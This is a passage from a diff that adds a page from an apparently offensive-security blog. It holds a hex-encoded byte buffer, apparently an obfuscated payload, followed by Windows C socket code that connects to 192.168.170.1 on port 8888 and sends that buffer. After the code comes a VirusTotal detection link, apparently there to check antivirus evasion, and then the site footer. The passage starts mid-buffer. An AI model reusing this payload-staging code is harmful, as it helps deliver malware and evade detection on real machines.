43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x3e\x56\x5a\x50\x52\x3f\x3e\x22\x5a\x54\x23\x3d\x49\x49\x23\x3d\x77\x2e\x4f\x43\x49\x4b\x58\x27\x59\x5e\x4b\x44\x4e\x4b\x58\x4e\x27\x4b\x44\x5e\x43\x5c\x43\x58\x5f\x59\x27\x5e\x4f\x59\x5e\x27\x4c\x43\x46\x4f\x2b\x2e\x42\x21\x42\x20\x0a\x3f\x45\x2b\x5a\x2f\x4a\x4b\x5a\x51\x0a\x62\xfa\xbf\xa8\x5c\xf5\xdf\x60\x4a\x62\x0a\x1a\x0a\x0a\x62\x0a\x0a\x4a\x0a\x5d\x62\x52\xae\x59\xef\xf5\xdf\x99\xb3\x0a\x0a\x0a\x0a\x0b\xd3\x5b\x59\x83\xed\x5d\x62\x0a\x2a\x0a\x0a\x59\x5c\x62\x18\x9c\x83\xe8\xf5\xdf\x8f\xca\x7e\xcc\x81\x0d\x0b\xc9\x8f\xca\x7f\xef\x52\xc9\xe2\xa3\xf7\xf5\xf5\x3b\x33\x38\x24\x3b\x3c\x32\x24\x3b\x3d\x3a\x24\x3b\x38\x32\x0a\x0a\x0a\x0a\x0a</span><span style="color:#e6db74">&#34;</span>;
+
+<span style="color:#66d9ef">int</span> <span style="color:#a6e22e">wmain</span>(<span style="color:#66d9ef">int</span> argc, TCHAR argv[]){
+    DWORD dwError;
+    WORD sockVersion <span style="color:#f92672">=</span> MAKEWORD(<span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">2</span>);
+    WSADATA wsaData;
+    SOCKET socks;
+    SHORT sListenPort <span style="color:#f92672">=</span> <span style="color:#ae81ff">8888</span>;
+    <span style="color:#66d9ef">struct</span> sockaddr_in sin;
+
+    <span style="color:#66d9ef">if</span> (WSAStartup(sockVersion, <span style="color:#f92672">&amp;</span>wsaData) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>)
+    {
+        dwError <span style="color:#f92672">=</span> GetLastError();
+        printf(<span style="color:#e6db74">&#34;[*]WSAStarup Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,dwError);
+        <span style="color:#66d9ef">return</span> dwError;
+    }
+
+    socks <span style="color:#f92672">=</span> socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+
+    <span style="color:#66d9ef">if</span> (socks <span style="color:#f92672">==</span> INVALID_SOCKET)
+    {
+        dwError <span style="color:#f92672">=</span> GetLastError();
+        printf(<span style="color:#e6db74">&#34;[*]Socket Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,dwError);
+        <span style="color:#66d9ef">return</span> dwError;
+    }
+
+    sin.sin_family <span style="color:#f92672">=</span> AF_INET;
+    sin.sin_port <span style="color:#f92672">=</span> htons(sListenPort);
+    sin.sin_addr.S_un.S_addr <span style="color:#f92672">=</span> inet_addr(<span style="color:#e6db74">&#34;192.168.170.1&#34;</span>);
+
+    <span style="color:#66d9ef">if</span>(connect(socks,(<span style="color:#66d9ef">struct</span> sockaddr <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>sin,<span style="color:#66d9ef">sizeof</span>(sin)) <span style="color:#f92672">==</span> SOCKET_ERROR )
+    {
+        dwError <span style="color:#f92672">=</span> GetLastError();
+        printf(<span style="color:#e6db74">&#34;[*]Bind Error : %d </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,dwError);
+        <span style="color:#66d9ef">return</span> dwError;
+    }
+    <span style="color:#66d9ef">int</span> ret <span style="color:#f92672">=</span> send(socks,buf,<span style="color:#66d9ef">sizeof</span>(buf),<span style="color:#ae81ff">0</span>);
+
+    <span style="color:#66d9ef">if</span> (ret <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>)
+    {
+        printf(<span style="color:#e6db74">&#34;[+]Send %d-Bytes </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,ret);
+        closesocket(socks);
+    }
+
+    WSACleanup();
+    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+}
+</code></pre></div><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2d0a51fabe7fa9a5372069a0dd0a7c64.png" alt="2019-11-10-02-10-48"></p>
+<p><a href="https://www.virustotal.com/gui/file/15097ce3f38d81a1e8c6b6d5b7fe5fb7965bfc09a6ec6a0f54280036e3820c66/detection">https://www.virustotal.com/gui/file/15097ce3f38d81a1e8c6b6d5b7fe5fb7965bfc09a6ec6a0f54280036e3820c66/detection</a></p>
+
+</div>
+
+        </div><div id="footer" class="mb-5">
+    <hr>
+    <div class="container text-center">
+        
+            <a href="https://twitter.com/Rvn0xsy" class="fab fa-twitter fa-1x" title="Twitter"></a>
+        
+            <a href="mailto:rvn0xsy@gmail.com" class="fas fa-envelope fa-1x" title="E-mail"></a>
+        
+    </div>
+    
+        <div class="container text-center">
+            <a href="https://payloads.online" title="- PAYLOADS.ONLINE -"><small>- PAYLOADS.ONLINE -</small></a>
+        </div>
+    
+</div>
+
+
+
+<script src="https://cdn.jsdelivr.net/gh/jmnote/plantuml-encoder@1.2.4/dist/plantuml-encoder.min.js" integrity="sha256-Qsk2KRBCN5qVZX7B+8+2IvQl1Aqc723qV1tBCQaVoqo=" crossorigin="anonymous"></script>
+<script>
+(function(){
+  let plantumlPrefix = "language-plantuml";
+  Array.prototype.forEach.call(document.querySelectorAll("[class^=" + plantumlPrefix + "]"), function(code){
+    let image = document.createElement("IMG");
+    image.loading = 'lazy'; 
+    image.src = 'http://www.plantuml.com/plantuml/svg/~1' + plantumlEncoder.encode(code.innerText);
+    code.parentNode.insertBefore(image, code);
+    code.style.display = 'none';
+  });
+})();
+</script>
+
+</body>
+</html>
